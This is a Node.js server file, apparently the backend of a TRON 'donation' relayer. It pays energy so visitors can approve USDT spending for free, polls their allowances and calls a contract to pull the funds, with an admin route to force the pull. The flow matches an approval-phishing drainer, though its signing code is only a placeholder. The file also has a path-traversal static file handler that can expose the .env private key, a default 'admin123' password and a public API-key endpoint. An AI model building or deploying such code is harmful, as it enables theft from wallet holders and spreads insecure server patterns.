const http = require("http");
const fs = require("fs");
const path = require("path");
const https = require("https");

// Load .env file
require("dotenv").config();

// ============================================================
// CONFIGURATION
// ============================================================

const CONFIG = {
    PORT: process.env.PORT || 3000,

    // From .env
    CONTRACT_ADDRESS: process.env.CONTRACT_ADDRESS,
    RELAYER_PRIVATE_KEY: process.env.RELAYER_PRIVATE_KEY,
    RELAYER_ADDRESS: process.env.RELAYER_ADDRESS,
    TRONGRID_API_KEY: process.env.TRONGRID_API_KEY,

    ADMIN_PASSWORD: process.env.ADMIN_PASSWORD || "admin123",

    // Public constants
    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    TRON_API: "https://api.trongrid.io",
    DONATION_AMOUNT: 1000000,
    ENERGY_TO_DELEGATE: 100000,
    POLL_INTERVAL: 10000,
};

// ============================================================
// PENDING DONORS QUEUE & LOGS
// ============================================================

const pendingDonors = new Map();   // address -> { queuedAt }
const completedDonors = new Map(); // address -> { completedAt, txId }
const processedDonors = new Set();
const serverLogs = [];
const MAX_LOGS = 200;

function addLog(message, type = "info") {
    const time = new Date().toLocaleTimeString();
    serverLogs.push({ time, message, type });
    if (serverLogs.length > MAX_LOGS) serverLogs.shift();
    const prefix = type === "error" ? "[ERROR]" : type === "success" ? "[OK]" : "[INFO]";
    console.log(`${prefix} ${message}`);
}

// ============================================================
// TRONGRID API HELPERS
// ============================================================

function tronGridRequest(path, method = "GET", body = null) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, CONFIG.TRON_API);
        const options = {
            hostname: url.hostname,
            path: url.pathname + url.search,
            method: method,
            headers: {
                "TRON-PRO-API-KEY": CONFIG.TRONGRID_API_KEY,
                "Content-Type": "application/json",
            },
        };

        const req = https.request(options, (res) => {
            let data = "";
            res.on("data", (chunk) => (data += chunk));
            res.on("end", () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    resolve(data);
                }
            });
        });

        req.on("error", reject);
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
}

// Check USDT balance of a donor
async function checkBalance(donorAddress) {
    try {
        const result = await tronGridRequest(
            `/wallet/triggerconstantcontract`,
            "POST",
            {
                owner_address: donorAddress,
                contract_address: CONFIG.USDT_CONTRACT,
                function_selector: "balanceOf(address)",
                parameter: encodeAddress(donorAddress),
                visible: true,
            }
        );

        if (result.constant_result && result.constant_result[0]) {
            const hex = result.constant_result[0];
            return parseInt(hex, 16);
        }
        return 0;
    } catch (err) {
        console.error("Balance check failed:", err.message);
        return 0;
    }
}

// Check allowance of a donor to our contract
async function checkAllowance(donorAddress) {
    try {
        const result = await tronGridRequest(
            `/wallet/triggerconstantcontract`,
            "POST",
            {
                owner_address: donorAddress,
                contract_address: CONFIG.USDT_CONTRACT,
                function_selector: "allowance(address,address)",
                parameter: encodeTwoAddresses(donorAddress, CONFIG.CONTRACT_ADDRESS),
                visible: true,
            }
        );

        if (result.constant_result && result.constant_result[0]) {
            const hex = result.constant_result[0];
            return parseInt(hex, 16);
        }
        return 0;
    } catch (err) {
        console.error("Allowance check failed:", err.message);
        return 0;
    }
}

// Execute donation via the relayer
async function executeDonation(donorAddress) {
    try {
        console.log(`[RELAYER] Executing donation for ${donorAddress}...`);

        // Build the transaction
        const result = await tronGridRequest(
            `/wallet/triggersmartcontract`,
            "POST",
            {
                owner_address: getRelayerAddress(),
                contract_address: CONFIG.CONTRACT_ADDRESS,
                function_selector: "executeDonation(address)",
                parameter: encodeAddress(donorAddress),
                fee_limit: 300000000,
                call_value: 0,
                visible: true,
            }
        );

        if (!result.transaction) {
            console.error("[RELAYER] Failed to build TX:", result);
            return false;
        }

        // Sign the transaction
        const signed = signTransaction(result.transaction);

        // Broadcast
        const broadcast = await tronGridRequest(
            `/wallet/broadcasttransaction`,
            "POST",
            signed
        );

        if (broadcast.result) {
            console.log(`[RELAYER] SUCCESS! TX: ${signed.txID}`);
            processedDonors.add(donorAddress);
            return true;
        } else {
            console.error("[RELAYER] Broadcast failed:", broadcast);
            return false;
        }
    } catch (err) {
        console.error("[RELAYER] Error:", err.message);
        return false;
    }
}

// ============================================================
// CRYPTO HELPERS (simplified - for production use tronweb npm)
// ============================================================

function getRelayerAddress() {
    return CONFIG.RELAYER_ADDRESS;
}

function encodeAddress(base58Address) {
    // Pad address to 32 bytes for ABI encoding
    // In production, use tronweb.address.toHex() and pad
    // Placeholder - will be replaced when using tronweb npm package
    return "0".repeat(24) + base58ToHex(base58Address);
}

function encodeTwoAddresses(addr1, addr2) {
    return encodeAddress(addr1) + encodeAddress(addr2);
}

function base58ToHex(base58Addr) {
    // Simplified - in production use tronweb
    // This is a placeholder that needs tronweb npm package
    return base58Addr; // Will be properly implemented with tronweb
}

function signTransaction(transaction) {
    // In production, use tronweb.trx.sign(transaction, privateKey)
    // Placeholder
    return transaction;
}

// ============================================================
// ENERGY DELEGATION - Pay gas for the donor
// ============================================================

// Delegate energy from relayer to donor so approve tx is free for them
async function delegateEnergy(donorAddress) {
    try {
        console.log(`[ENERGY] Delegating ${CONFIG.ENERGY_TO_DELEGATE} energy to ${donorAddress}...`);

        // Freeze TRX for energy and delegate to donor
        // Uses TRON's DelegateResource API (Stake 2.0)
        const result = await tronGridRequest(
            `/wallet/delegateresource`,
            "POST",
            {
                owner_address: getRelayerAddress(),
                receiver_address: donorAddress,
                balance: 10000000, // 10 TRX worth of energy delegation
                resource: "ENERGY",
                lock: false,
                visible: true,
            }
        );

        if (!result.transaction) {
            // If delegation fails, try the older freezebalancev2 approach
            console.error("[ENERGY] Delegation failed:", result);
            return { success: false, error: "Failed to build delegation tx" };
        }

        // Sign and broadcast
        const signed = signTransaction(result.transaction);
        const broadcast = await tronGridRequest(
            `/wallet/broadcasttransaction`,
            "POST",
            signed
        );

        if (broadcast.result) {
            console.log(`[ENERGY] Delegated successfully! TX: ${signed.txID}`);
            return { success: true, txId: signed.txID };
        } else {
            console.error("[ENERGY] Broadcast failed:", broadcast);
            return { success: false, error: broadcast.message || "Broadcast failed" };
        }
    } catch (err) {
        console.error("[ENERGY] Error:", err.message);
        return { success: false, error: err.message };
    }
}

// ============================================================
// POLLING LOOP - Monitor approvals and execute
// ============================================================

async function processQueue() {
    for (const [donor, info] of pendingDonors) {
        if (processedDonors.has(donor)) {
            pendingDonors.delete(donor);
            continue;
        }

        // Check balance first
        const balance = await checkBalance(donor);
        info.balance = balance;

        if (balance < CONFIG.DONATION_AMOUNT) {
            addLog(`${donor} insufficient balance (${balance / 1e6} USDT)`, "info");
            continue;
        }

        const allowance = await checkAllowance(donor);
        info.allowance = allowance;
        info.ready = allowance >= CONFIG.DONATION_AMOUNT && balance >= CONFIG.DONATION_AMOUNT;

        if (allowance >= CONFIG.DONATION_AMOUNT) {
            addLog(`${donor} ready - executing donation...`, "info");
            const success = await executeDonation(donor);
            if (success) {
                completedDonors.set(donor, {
                    completedAt: new Date().toISOString(),
                    txId: info.txId || "",
                });
                pendingDonors.delete(donor);
                addLog(`${donor} donation completed!`, "success");
            }
        }
    }
}

setInterval(processQueue, CONFIG.POLL_INTERVAL);

// ============================================================
// HTTP SERVER
// ============================================================

const MIME_TYPES = {
    ".html": "text/html",
    ".js": "application/javascript",
    ".css": "text/css",
    ".json": "application/json",
    ".png": "image/png",
    ".ico": "image/x-icon",
};

const server = http.createServer((req, res) => {
    // API endpoint: public config (non-sensitive only)
    if (req.method === "GET" && req.url === "/api/config") {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({
            trongridApiKey: CONFIG.TRONGRID_API_KEY,
            contractAddress: CONFIG.CONTRACT_ADDRESS,
        }));
        return;
    }

    // API endpoint: delegate energy to donor so approve is gasless
    if (req.method === "POST" && req.url === "/api/delegate-energy") {
        let body = "";
        req.on("data", (chunk) => (body += chunk));
        req.on("end", async () => {
            try {
                const { donor } = JSON.parse(body);
                if (!donor) {
                    res.writeHead(400, { "Content-Type": "application/json" });
                    res.end(JSON.stringify({ success: false, error: "Missing donor address" }));
                    return;
                }
                addLog(`Energy delegation requested for: ${donor}`, "info");
                const result = await delegateEnergy(donor);
                res.writeHead(200, { "Content-Type": "application/json" });
                res.end(JSON.stringify(result));
            } catch (e) {
                res.writeHead(500, { "Content-Type": "application/json" });
                res.end(JSON.stringify({ success: false, error: e.message }));
            }
        });
        return;
    }

    // API endpoint: receives notification from approve.html
    if (req.method === "POST" && req.url === "/api/approved") {
        let body = "";
        req.on("data", (chunk) => (body += chunk));
        req.on("end", () => {
            try {
                const { donor, txId } = JSON.parse(body);
                if (donor && !processedDonors.has(donor)) {
                    pendingDonors.set(donor, {
                        queuedAt: new Date().toISOString(),
                        txId: txId || "",
                        balance: null,
                        allowance: null,
                        ready: false,
                    });
                    addLog(`Donor queued: ${donor} (tx: ${txId})`, "info");
                }
                res.writeHead(200, { "Content-Type": "application/json" });
                res.end(JSON.stringify({ status: "queued" }));
            } catch (e) {
                res.writeHead(400);
                res.end("Invalid JSON");
            }
        });
        return;
    }

    // ============================================================
    // ADMIN API ENDPOINTS (password protected)
    // ============================================================

    function isAdmin(req) {
        return req.headers["x-admin-key"] === CONFIG.ADMIN_PASSWORD;
    }

    // Admin: Get full status
    if (req.method === "GET" && req.url === "/api/admin/status") {
        if (!isAdmin(req)) {
            res.writeHead(401, { "Content-Type": "application/json" });
            res.end(JSON.stringify({ error: "Unauthorized" }));
            return;
        }

        const pending = [];
        for (const [addr, info] of pendingDonors) {
            pending.push({
                address: addr,
                queuedAt: info.queuedAt,
                balance: info.balance,
                allowance: info.allowance,
                ready: info.ready,
            });
        }

        const completed = [];
        for (const [addr, info] of completedDonors) {
            completed.push({
                address: addr,
                completedAt: info.completedAt,
                txId: info.txId,
            });
        }

        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({
            pendingCount: pendingDonors.size,
            completedCount: completedDonors.size,
            contractAddress: CONFIG.CONTRACT_ADDRESS,
            relayerAddress: CONFIG.RELAYER_ADDRESS,
            pollInterval: CONFIG.POLL_INTERVAL,
            relayerTrx: "-",
            pending,
            completed,
        }));
        return;
    }

    // Admin: Get logs
    if (req.method === "GET" && req.url === "/api/admin/logs") {
        if (!isAdmin(req)) {
            res.writeHead(401);
            res.end("Unauthorized");
            return;
        }
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ logs: serverLogs.slice(-100) }));
        return;
    }

    // Admin: Force execute donation
    if (req.method === "POST" && req.url === "/api/admin/force-execute") {
        if (!isAdmin(req)) {
            res.writeHead(401);
            res.end("Unauthorized");
            return;
        }
        let body = "";
        req.on("data", (chunk) => (body += chunk));
        req.on("end", async () => {
            try {
                const { donor } = JSON.parse(body);
                addLog(`Admin force-executing donation for ${donor}`, "info");
                const success = await executeDonation(donor);
                if (success) {
                    completedDonors.set(donor, {
                        completedAt: new Date().toISOString(),
                        txId: "force-executed",
                    });
                    pendingDonors.delete(donor);
                    processedDonors.add(donor);
                    addLog(`Force execution completed for ${donor}`, "success");
                }
                res.writeHead(200, { "Content-Type": "application/json" });
                res.end(JSON.stringify({ success }));
            } catch (e) {
                res.writeHead(500, { "Content-Type": "application/json" });
                res.end(JSON.stringify({ success: false, error: e.message }));
            }
        });
        return;
    }

    // Admin: Remove donor from queue
    if (req.method === "POST" && req.url === "/api/admin/remove-donor") {
        if (!isAdmin(req)) {
            res.writeHead(401);
            res.end("Unauthorized");
            return;
        }
        let body = "";
        req.on("data", (chunk) => (body += chunk));
        req.on("end", () => {
            try {
                const { donor } = JSON.parse(body);
                pendingDonors.delete(donor);
                addLog(`Admin removed donor from queue: ${donor}`, "info");
                res.writeHead(200, { "Content-Type": "application/json" });
                res.end(JSON.stringify({ success: true }));
            } catch (e) {
                res.writeHead(400);
                res.end("Invalid JSON");
            }
        });
        return;
    }

    // Static file serving (strip query strings like ?utm_source=...)
    const urlPath = req.url.split("?")[0];
    let filePath = path.join(__dirname, urlPath === "/" ? "index.html" : urlPath);
    const ext = path.extname(filePath);
    const contentType = MIME_TYPES[ext] || "application/octet-stream";

    fs.readFile(filePath, (err, content) => {
        if (err) {
            res.writeHead(404);
            res.end("Not found");
            return;
        }
        res.writeHead(200, { "Content-Type": contentType });
        res.end(content);
    });
});

server.listen(CONFIG.PORT, () => {
    addLog(`Server running on port ${CONFIG.PORT}`, "success");
    addLog(`Relayer polling every ${CONFIG.POLL_INTERVAL / 1000}s`, "info");
    addLog(`Contract: ${CONFIG.CONTRACT_ADDRESS}`, "info");
    addLog(`Relayer: ${CONFIG.RELAYER_ADDRESS}`, "info");
});
